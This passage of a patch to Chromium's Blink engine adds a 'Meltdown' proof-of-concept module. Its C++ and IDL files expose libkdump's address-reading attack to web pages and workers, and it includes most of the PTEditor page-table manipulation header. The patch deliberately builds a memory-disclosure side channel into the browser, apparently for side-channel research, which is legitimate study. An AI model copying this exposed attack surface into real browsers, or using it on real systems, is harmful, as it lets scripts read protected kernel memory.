++ * @return 0 Cleanup was successful
++ * @return -1 Cleanup failed, errno contains the error code
++ */
++int libkdump_cleanup();
++
++/**
++ * Converts a physical address to a virtual address using the physical direct
++ * map offset.
++ *
++ * @param[in] addr The physical address to convert
++ *
++ * @return The virtual address, or -1ULL if an error occured.
++ */
++size_t libkdump_phys_to_virt(size_t addr);
++
++/**
++ * Enables or disables the debug output of libkdump as required.
++ *
++ * @param[in] enable Enable (1) or disable (0) the debug output of libkdump.
++ * Default is disabled.
++ */
++void libkdump_enable_debug(int enable);
++
++#endif
+diff --git a/third_party/blink/renderer/modules/sca/meltdown.cc b/third_party/blink/renderer/modules/sca/meltdown.cc
+new file mode 100644
+index 0000000000..45679297af
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/meltdown.cc
+@@ -0,0 +1,86 @@
++/**
++ * @file meltdown.cc
++ * @author Jonathan Busch (jonathan.busch@pm.me)
++ * @brief Implementation of meltdown.h.
++ * @version 0.1
++ * @date 2022-01-21
++ *
++ * @copyright Copyright (c) 2022
++ *
++ */
++
++#include "third_party/blink/renderer/modules/sca/meltdown.h"
++#include "third_party/blink/renderer/platform/wtf/text/wtf_string.h"
++#ifdef __linux__
++#include "third_party/blink/renderer/modules/sca/libkdump.h"
++#endif
++
++namespace blink {
++String Meltdown::initAutoconfig() {
++#ifdef __linux__
++  libkdump_config_t config;
++  config = libkdump_get_autoconfig();
++  libkdump_init(config);
++  return String(config_to_string(config));
++#else
++  return "";
++#endif
++}
++
++String Meltdown::init(unsigned long cacheMissThreshold,
++                      String faultHandling,
++                      int measurements,
++                      int acceptAfter,
++                      int loadThreads,
++                      String loadType,
++                      int retries,
++                      unsigned long long physicalOffset) {
++#ifdef __linux__
++  libkdump_config_t config;
++  config.cache_miss_threshold = cacheMissThreshold;
++  config.fault_handling = fault_handling_to_enum(faultHandling.Ascii());
++  config.measurements = measurements;
++  config.accept_after = acceptAfter;
++  config.load_threads = loadThreads;
++  config.load_type = load_type_to_enum(loadType.Ascii());
++  config.retries = retries;
++  config.physical_offset = physicalOffset;
++  libkdump_init(config);
++
++  return String(config_to_string(config));
++#else
++  return "";
++#endif
++}
++
++String Meltdown::configToString() {
++#ifdef __linux__
++  libkdump_config_t config;
++  config = get_current_config();
++  return String(config_to_string(config));
++#else
++  return "";
++#endif
++}
++
++int Meltdown::read(unsigned long long addr) {
++#ifdef __linux__
++  libkdump_config_t config;
++  config = get_current_config();
++  // Checking whether libkdump has bin initialized
++  if (config.cache_miss_threshold == 0) {
++    config = libkdump_get_autoconfig();
++    libkdump_init(config);
++  }
++  return libkdump_read(addr);
++#else
++  return 0;
++#endif
++}
++
++void Meltdown::cleanup() {
++#ifdef __linux__
++  libkdump_cleanup();
++#endif
++}
++}  // namespace blink
+diff --git a/third_party/blink/renderer/modules/sca/meltdown.h b/third_party/blink/renderer/modules/sca/meltdown.h
+new file mode 100644
+index 0000000000..597d71f07e
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/meltdown.h
+@@ -0,0 +1,56 @@
++/**
++ * @file meltdown.h
++ * @author Jonathan Busch (jonathan.busch@pm.me)
++ * @brief PoC of Meltdown using libkdump library.
++ * @version 0.1
++ * @date 2022-01-21
++ *
++ * @copyright Copyright (c) 2022
++ *
++ */
++#ifndef THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_MELTDOWN_H_
++#define THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_MELTDOWN_H_
++
++#include "third_party/blink/renderer/core/dom/dom_high_res_time_stamp.h"
++#include "third_party/blink/renderer/platform/bindings/script_wrappable.h"
++#include "third_party/blink/renderer/platform/wtf/text/wtf_string.h"
++
++#ifdef _MSC_VER
++#include <intrin.h> /* for rdtscp and clflush */
++#pragma optimize("gt", on)
++#else
++#include <x86intrin.h> /* for rdtscp and clflush */
++#endif
++
++namespace blink {
++
++class Meltdown final : public ScriptWrappable {
++  DEFINE_WRAPPERTYPEINFO();
++
++ public:
++  static Meltdown* Create() { return MakeGarbageCollected<Meltdown>(); }
++
++  Meltdown() = default;
++
++  String initAutoconfig();
++
++  String init(unsigned long cacheMissThreshold,
++              String faultHandling,
++              int measurements,
++              int acceptAfter,
++              int loadThreads,
++              String loadType,
++              int retries,
++              unsigned long long physicalOffset);
++
++  String configToString();
++
++  int read(unsigned long long addr);
++
++  void cleanup();
++
++ private:
++};
++}  // namespace blink
++
++#endif  // THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_MELTDOWN_H_
+diff --git a/third_party/blink/renderer/modules/sca/meltdown.idl b/third_party/blink/renderer/modules/sca/meltdown.idl
+new file mode 100644
+index 0000000000..bdf63806fb
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/meltdown.idl
+@@ -0,0 +1,18 @@
++// Author: Jonathan Busch (jonathan.busch@pm.me), 2022
++
++[Exposed = (Window, Worker)]
++interface Meltdown {
++  [Affects = Nothing] DOMString initAutoconfig();
++  [Affects = Nothing] DOMString init(unsigned long cacheMissThreshold,
++              DOMString faultHandling,
++              unsigned long measurements,
++              unsigned long acceptAfter,
++              unsigned long loadThreads,
++              DOMString loadType,
++              unsigned long retries,
++              unsigned long long physicalOffset);
++  [Affects = Nothing] DOMString configToString();
++  [Affects = Nothing] unsigned long read(unsigned long long addr);
++  [Affects = Nothing] void cleanup();
++
++};
+diff --git a/third_party/blink/renderer/modules/sca/ptedit_header.h b/third_party/blink/renderer/modules/sca/ptedit_header.h
+new file mode 100644
+index 0000000000..3adc760803
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/ptedit_header.h
+@@ -0,0 +1,1906 @@
++// Warning: this file was generated by make. DO NOT EDIT!
++/* See LICENSE file for license and copyright information at
++ * https://github.com/misc0110/PTEditor*/
++
++#ifndef PTEDITOR_MODULE_H
++#define PTEDITOR_MODULE_H
++
++#if defined(__linux__) || defined(__linux) || defined(__unix__) || \
++    defined(LINUX) || defined(UNIX)
++#define LINUX
++#endif
++#if defined(_WIN32) || defined(_WIN64) || defined(__MINGW32__) || \
++    defined(__CYGWIN__)
++#define WINDOWS
++#undef LINUX
++#endif
++
++#include <stddef.h>
++
++#if defined(LINUX)
++#define PTEDITOR_DEVICE_NAME "pteditor"
++#define PTEDITOR_DEVICE_PATH "/dev/" PTEDITOR_DEVICE_NAME
++#else
++#define PTEDITOR_DEVICE_NAME L"PTEditorLink"
++#define PTEDITOR_DEVICE_PATH L"\\\\.\\" PTEDITOR_DEVICE_NAME
++#endif
++
++/**
++ * Structure containing the page-table entries of all levels.
++ * The Linux names are aliased with the Intel names.
++ */
++typedef struct {
++  /** Process ID */
++  size_t pid;
++  /** Virtual address */
++  size_t vaddr;
++
++  /** Page global directory / Page map level 5 */
++  union {
++    size_t pgd;
++    size_t pml5;
++  };
++  /** Page directory 4 / Page map level 4 */
++  union {
++    size_t p4d;
++    size_t pml4;
++  };
++  /** Page upper directory / Page directory pointer table */
++  union {
++    size_t pud;
++    size_t pdpt;
++  };
++  /** Page middle directory / Page directory */
++  union {
++    size_t pmd;
++    size_t pd;
++  };
++  /** Page table entry */
++  size_t pte;
++  /** Bitmask indicating which entries are valid/should be updated */
++  size_t valid;
++} ptedit_entry_t;
++
++/**
++ * Structure to read/write physical pages
++ */
++#if defined(LINUX)
++typedef struct {
++  /** Page-frame number */
++  size_t pfn;
++  /** Virtual address */
++  size_t vaddr;
++  /** Page size */
++  size_t size;
++  /** Page content */
++  unsigned char* buffer;
++} ptedit_page_t;
++#else
++__pragma(pack(push, 1)) typedef struct {
++  char content[4096];
++  size_t paddr;
++} ptedit_page_t;
++__pragma(pack(pop))
++#endif
++
++/**
++ * Structure to get/set the root of paging
++ */
++typedef struct {
++  /** Process id */
++  size_t pid;
++  /** Physical address of paging root */
++  size_t root;
++} ptedit_paging_t;
++
++#define PTEDIT_VALID_MASK_PGD (1 << 0)
++#define PTEDIT_VALID_MASK_P4D (1 << 1)
++#define PTEDIT_VALID_MASK_PUD (1 << 2)
++#define PTEDIT_VALID_MASK_PMD (1 << 3)
++#define PTEDIT_VALID_MASK_PTE (1 << 4)
++
++#define PTEDITOR_TLB_INVALIDATION_KERNEL 0
++#define PTEDITOR_TLB_INVALIDATION_CUSTOM 1
++
++#if defined(LINUX)
++#define PTEDITOR_IOCTL_MAGIC_NUMBER (long)0x3d17
++
++#define PTEDITOR_IOCTL_CMD_VM_RESOLVE \
++  _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 1, size_t)
++
++#define PTEDITOR_IOCTL_CMD_VM_UPDATE \
++  _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 2, size_t)
++
++#define PTEDITOR_IOCTL_CMD_VM_LOCK _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 3, size_t)
++
++#define PTEDITOR_IOCTL_CMD_VM_UNLOCK \
++  _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 4, size_t)
++
++#define PTEDITOR_IOCTL_CMD_READ_PAGE \
++  _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 5, size_t)
++
++#define PTEDITOR_IOCTL_CMD_WRITE_PAGE \
++  _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 6, size_t)
++
++#define PTEDITOR_IOCTL_CMD_GET_ROOT _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 7, size_t)
++
++#define PTEDITOR_IOCTL_CMD_SET_ROOT _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 8, size_t)
++
++#define PTEDITOR_IOCTL_CMD_GET_PAGESIZE \
++  _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 9, size_t)
++
++#define PTEDITOR_IOCTL_CMD_INVALIDATE_TLB \
++  _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 10, size_t)
++
++#define PTEDITOR_IOCTL_CMD_GET_PAT _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 11, size_t)
++
++#define PTEDITOR_IOCTL_CMD_SET_PAT _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 12, size_t)
++
++#define PTEDITOR_IOCTL_CMD_SWITCH_TLB_INVALIDATION \
++  _IOR(PTEDITOR_IOCTL_MAGIC_NUMBER, 13, size_t)
++#else
++#include <windows.h>
++#include <winioctl.h>
++
++#define PTEDITOR_READ_PAGE \
++  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
++#define PTEDITOR_WRITE_PAGE \
++  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_READ_DATA)
++#define PTEDITOR_GET_CR3 \
++  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
++#define PTEDITOR_FLUSH_TLB \
++  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
++#define PTEDITOR_READ_PHYS_VAL \
++  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
++#define PTEDITOR_WRITE_PHYS_VAL \
++  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
++#define PTEDITOR_SET_CR3 \
++  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
++#define PTEDITOR_SET_PAT \
++  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
++#define PTEDITOR_GET_PAT \
++  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
++#endif
++
++#endif  // PTEDITOR_MODULE_H
++/** @file */
++
++#ifndef _PTEDITOR_H_
++#define _PTEDITOR_H_
++
++#define ptedit_fnc static
++
++#include <sys/types.h>
++
++#if defined(WINDOWS)
++typedef size_t pid_t;
++#endif
++
++/**
++ * The implementation of PTEditor to use
++ *
++ * @defgroup PTEDITOR_IMPLEMENTATION PTEditor Implementation
++ *
++ * @{
++ */
++
++/** Use the kernel to resolve and update paging structures */
++#define PTEDIT_IMPL_KERNEL 0
++/** Use the user-space implemenation to resolve and update paging structures,
++ * using pread to read from the memory mapping */
++#define PTEDIT_IMPL_USER_PREAD 1
++/** Use the user-space implemenation that maps the physical memory into user
++ * space to resolve and update paging structures */
++#define PTEDIT_IMPL_USER 2
++
++/**
++ * The bits in a page-table entry
++ *
++ * @defgroup PAGETABLE_BITS Page Table Bits
++ *
++ * @{
++ *
++ */
++
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++
++/** Page is present */
++#define PTEDIT_PAGE_BIT_PRESENT 0
++/** Page is writeable */
++#define PTEDIT_PAGE_BIT_RW 1
++/** Page is userspace addressable */
++#define PTEDIT_PAGE_BIT_USER 2
++/** Page write through */
++#define PTEDIT_PAGE_BIT_PWT 3
++/** Page cache disabled */
++#define PTEDIT_PAGE_BIT_PCD 4
++/** Page was accessed (raised by CPU) */
++#define PTEDIT_PAGE_BIT_ACCESSED 5
++/** Page was written to (raised by CPU) */
++#define PTEDIT_PAGE_BIT_DIRTY 6
++/** 4 MB (or 2MB) page */
++#define PTEDIT_PAGE_BIT_PSE 7
++/** PAT (only on 4KB pages) */
++#define PTEDIT_PAGE_BIT_PAT 7
++/** Global TLB entry PPro+ */
++#define PTEDIT_PAGE_BIT_GLOBAL 8
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW1 9
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW2 10
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW3 11
++/** PAT (on 2MB or 1GB pages) */
++#define PTEDIT_PAGE_BIT_PAT_LARGE 12
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW4 58
++/** Protection Keys, bit 1/4 */
++#define PTEDIT_PAGE_BIT_PKEY_BIT0 59
++/** Protection Keys, bit 2/4 */
++#define PTEDIT_PAGE_BIT_PKEY_BIT1 60
++/** Protection Keys, bit 3/4 */
++#define PTEDIT_PAGE_BIT_PKEY_BIT2 61
++/** Protection Keys, bit 4/4 */
++#define PTEDIT_PAGE_BIT_PKEY_BIT3 62
++/** No execute: only valid after cpuid check */
++#define PTEDIT_PAGE_BIT_NX 63
++
++#elif defined(__aarch64__)
++
++/** Entry type 1/2 */
++#define PTEDIT_PAGE_BIT_TYPE_BIT0 0
++/** Entry type 1/2 */
++#define PTEDIT_PAGE_BIT_TYPE_BIT1 1
++/** Memory attribute index 1/3 */
++#define PTEDIT_PAGE_BIT_MAIR_BIT0 2
++/** Memory attribute index 2/3 */
++#define PTEDIT_PAGE_BIT_MAIR_BIT1 3
++/** Memory attribute index 3/3 */
++#define PTEDIT_PAGE_BIT_MAIR_BIT2 4
++/** Page is non-secure */
++#define PTEDIT_PAGE_BIT_NON_SECURE 5
++/** Page permissions 1/2 */
++#define PTEDIT_PAGE_BIT_PERMISSION_BIT0 6
++/** Page permissions 2/2 */
++#define PTEDIT_PAGE_BIT_PERMISSION_BIT1 7
++/** Shareability domain 1/2 */
++#define PTEDIT_PAGE_BIT_SHARE_BIT0 8
++/** Shareability domain 2/2 */
++#define PTEDIT_PAGE_BIT_SHARE_BIT1 9
++/** Page was accessed (raised by CPU) */
++#define PTEDIT_PAGE_BIT_ACCESSED 10
++/** Page is not global */
++#define PTEDIT_PAGE_BIT_NOT_GLOBAL 11
++/** Contiguous */
++#define PTEDIT_PAGE_BIT_CONTIGUOUS 52
++/** Privileged execute never */
++#define PTEDIT_PAGE_BIT_PXN 53
++/** Execute never */
++#define PTEDIT_PAGE_BIT_XN 54
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW1 55
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW2 56
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW3 57
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW4 58
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW5 59
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW6 60
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW7 61
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW8 62
++/** Available for programmer */
++#define PTEDIT_PAGE_BIT_SOFTW9 63
++
++#endif
++/** @} */
++
++/**
++ * The memory types (PAT/MAIR)values
++ *
++ * @defgroup MEMORY_TYPES Memory Types (PAT/MAIR values)
++ *
++ * @{
++ */
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++
++/** Strong uncachable (nothing is cached) */
++#define PTEDIT_MT_UC 0
++/** Write combining (consecuite writes are combined in a WC buffer and then
++ * written once) */
++#define PTEDIT_MT_WC 1
++/** Write through (read accesses are cached, write access are written to cache
++ * and memory) */
++#define PTEDIT_MT_WT 4
++/** Write protected (only read access is cached) */
++#define PTEDIT_MT_WP 5
++/** Write back (read and write accesses are cached) */
++#define PTEDIT_MT_WB 6
++/** Uncachable (as UC, but can be changed to WC through MTRRs) */
++#define PTEDIT_MT_UCMINUS 7
++
++#elif defined(__aarch64__)
++
++/** Strong uncachable (nothing is cached) */
++#define PTEDIT_MT_UC 0x44
++/** Write through (read accesses are cached, write access are written to cache
++ * and memory) */
++#define PTEDIT_MT_WT 0xbb
++/** Write back (read and write accesses are cached) */
++#define PTEDIT_MT_WB 0xff
++
++#endif
++/** @} */
++
++/**
++ * Basic functionality required in every program
++ *
++ * @defgroup BASIC Basic Functionality
++ *
++ * @{
++ */
++
++/**
++ * Initializes (and acquires) PTEditor kernel module
++ *
++ * @return 0 Initialization was successful
++ * @return -1 Initialization failed
++ */
++ptedit_fnc int ptedit_init();
++
++/**
++ * Releases PTEditor kernel module
++ *
++ */
++ptedit_fnc void ptedit_cleanup();
++
++/**
++ * Switch between kernel and user-space implementation
++ *
++ * @param[in] implementation The implementation to use, either
++ * PTEDIT_IMPL_KERNEL, PTEDIT_IMPL_USER, or PTEDIT_IMPL_USER_PREAD
++ *
++ */
++ptedit_fnc void ptedit_use_implementation(int implementation);
++
++/** @} */
++
++/**
++ * Functions to read and write page tables
++ *
++ * @defgroup PAGETABLE Page tables
++ *
++ * @{
++ */
++
++typedef ptedit_entry_t (*ptedit_resolve_t)(void*, pid_t);
++typedef void (*ptedit_update_t)(void*, pid_t, ptedit_entry_t*);
++
++/**
++ * Resolves the page-table entries of all levels for a virtual address of a
++ * given process.
++ *
++ * @param[in] address The virtual address to resolve
++ * @param[in] pid The pid of the process (0 for own process)
++ *
++ * @return A structure containing the page-table entries of all levels.
++ */
++ptedit_fnc ptedit_resolve_t ptedit_resolve;
++
++/**
++ * Updates one or more page-table entries for a virtual address of a given
++ * process. The TLB for the given address is flushed after updating the entries.
++ *
++ * @param[in] address The virtual address
++ * @param[in] pid The pid of the process (0 for own process)
++ * @param[in] vm A structure containing the values for the page-table entries
++ * and a bitmask indicating which entries to update
++ *
++ */
++ptedit_fnc ptedit_update_t ptedit_update;
++
++/**
++ * Sets a bit directly in the PTE of an address.
++ *
++ * @param[in] address The virtual address
++ * @param[in] pid The pid of the process (0 for own process)
++ * @param[in] bit The bit to set (one of PTEDIT_PAGE_BIT_*)
++ *
++ */
++ptedit_fnc void ptedit_pte_set_bit(void* address, pid_t pid, int bit);
++
++/**
++ * Clears a bit directly in the PTE of an address.
++ *
++ * @param[in] address The virtual address
++ * @param[in] pid The pid of the process (0 for own process)
++ * @param[in] bit The bit to clear (one of PTEDIT_PAGE_BIT_*)
++ *
++ */
++ptedit_fnc void ptedit_pte_clear_bit(void* address, pid_t pid, int bit);
++
++/**
++ * Returns the value of a bit directly from the PTE of an address.
++ *
++ * @param[in] address The virtual address
++ * @param[in] pid The pid of the process (0 for own process)
++ * @param[in] bit The bit to get (one of PTEDIT_PAGE_BIT_*)
++ *
++ * @return The value of the bit (0 or 1)
++ *
++ */
++ptedit_fnc unsigned char ptedit_pte_get_bit(void* address, pid_t pid, int bit);
++
++/**
++ * Reads the PFN directly from the PTE of an address.
++ *
++ * @param[in] address The virtual address
++ * @param[in] pid The pid of the process (0 for own process)
++ *
++ * @return The page-frame number (PFN)
++ *
++ */
++ptedit_fnc size_t ptedit_pte_get_pfn(void* address, pid_t pid);
++
++/**
++ * Sets the PFN directly in the PTE of an address.
++ *
++ * @param[in] address The virtual address
++ * @param[in] pid The pid of the process (0 for own process)
++ * @param[in] pfn The new page-frame number (PFN)
++ *
++ */
++ptedit_fnc void ptedit_pte_set_pfn(void* address, pid_t pid, size_t pfn);
++
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++#define PTEDIT_PAGE_PRESENT 1
++
++/**
++ * Struct to access the fields of the PGD
++ */
++#pragma pack(push, 1)
++typedef struct {
++  size_t present : 1;
++  size_t writeable : 1;
++  size_t user_access : 1;
++  size_t write_through : 1;
++  size_t cache_disabled : 1;
++  size_t accessed : 1;
++  size_t ignored_3 : 1;
++  size_t size : 1;
++  size_t ignored_2 : 4;
++  size_t pfn : 28;
++  size_t reserved_1 : 12;
++  size_t ignored_1 : 11;
++  size_t execution_disabled : 1;
++} ptedit_pgd_t;
++#pragma pack(pop)
++
++/**
++ * Struct to access the fields of the P4D
++ */
++typedef ptedit_pgd_t ptedit_p4d_t;
++
++/**
++ * Struct to access the fields of the PUD
++ */
++typedef ptedit_pgd_t ptedit_pud_t;
++
++/**
++ * Struct to access the fields of the PMD
++ */
++typedef ptedit_pgd_t ptedit_pmd_t;
++
++/**
++ * Struct to access the fields of the PMD when mapping a  large page (2MB)
++ */
++#pragma pack(push, 1)
++typedef struct {
++  size_t present : 1;
++  size_t writeable : 1;
++  size_t user_access : 1;
++  size_t write_through : 1;
++  size_t cache_disabled : 1;
++  size_t accessed : 1;
++  size_t dirty : 1;
++  size_t size : 1;
++  size_t global : 1;
++  size_t ignored_2 : 3;
++  size_t pat : 1;
++  size_t reserved_2 : 8;
++  size_t pfn : 19;
++  size_t reserved_1 : 12;
++  size_t ignored_1 : 11;
++  size_t execution_disabled : 1;
++} ptedit_pmd_large_t;
++#pragma pack(pop)
++
++/**
++ * Struct to access the fields of the PTE
++ */
++#pragma pack(push, 1)
++typedef struct {
++  size_t present : 1;
++  size_t writeable : 1;
++  size_t user_access : 1;
++  size_t write_through : 1;
++  size_t cache_disabled : 1;
++  size_t accessed : 1;
++  size_t dirty : 1;
++  size_t size : 1;
++  size_t global : 1;
++  size_t ignored_2 : 3;
++  size_t pfn : 28;
++  size_t reserved_1 : 12;
++  size_t ignored_1 : 11;
++  size_t execution_disabled : 1;
++} ptedit_pte_t;
++#pragma pack(pop)
++
++#elif defined(__aarch64__)
++#define PTEDIT_PAGE_PRESENT 3
++
++/**
++ * Struct to access the fields of the PGD
++ */
++typedef struct {
++  size_t present : 2;
++  size_t ignored_1 : 10;
++  size_t pfn : 36;
++  size_t reserved : 4;
++  size_t ignored_2 : 7;
++  size_t pxn_table : 1;
++  size_t xn_table : 1;
++  size_t ap_table : 2;
++  size_t ns_table : 1;
++} __attribute__((__packed__)) ptedit_pgd_t;
++
++/**
++ * Struct to access the fields of the P4D
++ */
++typedef ptedit_pgd_t ptedit_p4d_t;
++
++/**
++ * Struct to access the fields of the PUD
++ */
++typedef ptedit_pgd_t ptedit_pud_t;
++
++/**
++ * Struct to access the fields of the PMD
++ */
++typedef ptedit_pgd_t ptedit_pmd_t;
++
++/**
++ * Struct to access the fields of the PGD when mapping a large page
++ */
++typedef struct {
++  size_t present : 2;
++  size_t memory_attributes_index : 3;
++  size_t non_secure : 1;
++  size_t access_permissions : 2;
++  size_t shareability_field : 2;
++  size_t access_flag : 1;
++  size_t not_global : 1;
++  size_t reserved_1 : 18;
++  size_t pfn : 18;
++  size_t reserved_2 : 4;
++  size_t contiguous : 1;
++  size_t privileged_execute_never : 1;
++  size_t execute_never : 1;
++  size_t ingored_1 : 4;
++  size_t ignored_2 : 5;
++} __attribute__((__packed__)) ptedit_pgd_large_t;
++
++/**
++ * Struct to access the fields of the PMD when mapping a large page
++ */
++typedef struct {
++  size_t present : 2;
++  size_t memory_attributes_index : 3;
++  size_t non_secure : 1;
++  size_t access_permissions : 2;
++  size_t shareability_field : 2;
++  size_t access_flag : 1;
++  size_t not_global : 1;
++  size_t reserved_1 : 9;
++  size_t pfn : 27;
++  size_t reserved_2 : 4;
++  size_t contiguous : 1;
++  size_t privileged_execute_never : 1;
++  size_t execute_never : 1;
++  size_t ingored_1 : 4;
++  size_t ignored_2 : 5;
++} __attribute__((__packed__)) ptedit_pmd_large_t;
++
++/**
++ * Struct to access the fields of the PTE
++ */
++typedef struct {
++  size_t present : 2;
++  size_t memory_attributes_index : 3;
++  size_t non_secure : 1;
++  size_t access_permissions : 2;
++  size_t shareability_field : 2;
++  size_t access_flag : 1;
++  size_t not_global : 1;
++  size_t pfn : 36;
++  size_t reserved_1 : 4;
++  size_t contiguous : 1;
++  size_t privileged_execute_never : 1;
++  size_t execute_never : 1;
++  size_t ingored_1 : 4;
++  size_t ignored_2 : 5;
++} __attribute__((__packed__)) ptedit_pte_t;
++#endif
++
++/**
++ * Casts a paging structure entry (e.g., page table) to a structure with easy
++ * access to its fields
++ *
++ * @param[in] v Entry to Cast
++ * @param[in] type Data type of struct to cast to, e.g., ptedit_pte_t
++ *
++ * @return Struct of type "type" with easily accessible fields
++ */
++#define ptedit_cast(v, type) (*((type*)(&(v))))
++
++/** @} */
++
++/**
++ * General system info
++ *
++ * @defgroup SYSTEMINFO System info
++ *
++ * @{
++ */
++
++/**
++ * Returns the default page size of the system
++ *
++ * @return Page size of the system in bytes
++ */
++ptedit_fnc int ptedit_get_pagesize();
++
++/** @} */
++
++/**
++ * Get and set page frame numbers
++ *
++ * @defgroup PFN Page frame numbers (PFN)
++ *
++ * @{
++ */
++
++/**
++ * Returns a new page-table entry where the page-frame number (PFN) is replaced
++ * by the specified one.
++ *
++ * @param[in] entry The page-table entry to modify
++ * @param[in] pfn The new page-frame number (PFN)
++ *
++ * @return A new page-table entry with the given page-frame number
++ */
++ptedit_fnc size_t ptedit_set_pfn(size_t entry, size_t pfn);
++
++/**
++ * Returns the page-frame number (PFN) of a page-table entry.
++ *
++ * @param[in] entry The page-table entry to extract the PFN from
++ *
++ * @return The page-frame number
++ */
++ptedit_fnc size_t ptedit_get_pfn(size_t entry);
++
++/** @} */
++
++/**
++ * Reading and writing of physical pages
++ *
++ * @defgroup PHYSICALPAGE Physical pages
++ *
++ * @{
++ */
++
++/**
++ * Retrieves the content of a physical page.
++ *
++ * @param[in] pfn The page-frame number (PFN) of the page to read
++ * @param[out] buffer A buffer which is large enough to hold the content of the
++ * page
++ *
++ */
++ptedit_fnc void ptedit_read_physical_page(size_t pfn, char* buffer);
++
++/**
++ * Replaces the content of a physical page.
++ *
++ * @param[in] pfn The page-frame number (PFN) of the page to update
++ * @param[in] content A buffer containing the new content of the page (must be
++ * the size of a physical page)
++ *
++ */
++ptedit_fnc void ptedit_write_physical_page(size_t pfn, char* content);
++
++/**
++ * Map a physical address range.
++ *
++ * @param[in] physical The physical address to map
++ * @param[in] length The length of the physical memory range to map
++ *
++ * @return A virtual address that can be used to access the physical range
++ */
++ptedit_fnc void* ptedit_pmap(size_t physical, size_t length);
++
++/** @} */
++
++/**
++ * Read and modify the root of paging structure
++ *
++ * @defgroup PAGING Paging
++ *
++ * @{
++ */
++
++/**
++ * Returns the root of the paging structure (i.e., CR3 on x86 and TTBR0 on ARM).
++ *
++ * @param[in] pid The proccess id (0 for own process)
++ *
++ * @return The phyiscal address (not PFN!) of the first page table (i.e., the
++ * PGD)
++ *
++ */
++ptedit_fnc size_t ptedit_get_paging_root(pid_t pid);
++
++/**
++ * Sets the root of the paging structure (i.e., CR3 on x86 and TTBR0 on ARM).
++ *
++ * @param[in] pid The proccess id (0 for own process)
++ * @param[in] root The physical address (not PFN!) of the first page table
++ * (i.e., the PGD)
++ *
++ */
++ptedit_fnc void ptedit_set_paging_root(pid_t pid, size_t root);
++
++/** @} */
++
++/**
++ * Invalidations and barriers
++ *
++ * @defgroup BARRIERS TLB/Barriers
++ *
++ * @{
++ */
++
++/**
++ * Invalidates the TLB for a given address on all CPUs.
++ *
++ * @param[in] address The address to invalidate
++ *
++ */
++ptedit_fnc void ptedit_invalidate_tlb(void* address);
++
++/**
++ * Change the method used for flushing the TLB (either kernel or custom
++ * function)
++ *
++ * @param[in] implementation The implementation to use, either
++ * PTEDITOR_TLB_INVALIDATION_KERNEL or PTEDITOR_TLB_INVALIDATION_CUSTOM
++ *
++ * @return 0 on success, -1 on failure
++ */
++ptedit_fnc int ptedit_switch_tlb_invalidation(int implementation);
++
++/**
++ * A full serializing barrier which stops everything.
++ *
++ */
++ptedit_fnc void ptedit_full_serializing_barrier();
++
++/** @} */
++
++/**
++ * Memory types (x86 PATs / ARM MAIR)
++ *
++ * @defgroup MTS Memory types (PATs / MAIR)
++ *
++ * @{
++ */
++
++/**
++ * Reads the value of all memory types (x86 PATs / ARM MAIRs). This is
++ * equivalent to reading the MSR 0x277 (x86) / MAIR_EL1 (ARM).
++ *
++ * @return The memory types in the same format as in the IA32_PAT MSR / MAIR_EL1
++ *
++ */
++ptedit_fnc size_t ptedit_get_mts();
++
++/**
++ * Programs the value of all memory types (x86 PATs / ARM MAIRs). This is
++ * equivalent to writing to the MSR 0x277 (x86) / MAIR_EL1 (ARM) on all CPUs.
++ *
++ * @param[in] mts The memory types in the same format as in the IA32_PAT MSR /
++ * MAIR_EL1
++ *
++ */
++ptedit_fnc void ptedit_set_mts(size_t mts);
++
++/**
++ * Reads the value of a specific memory type attribute (PAT/MAIR).
++ *
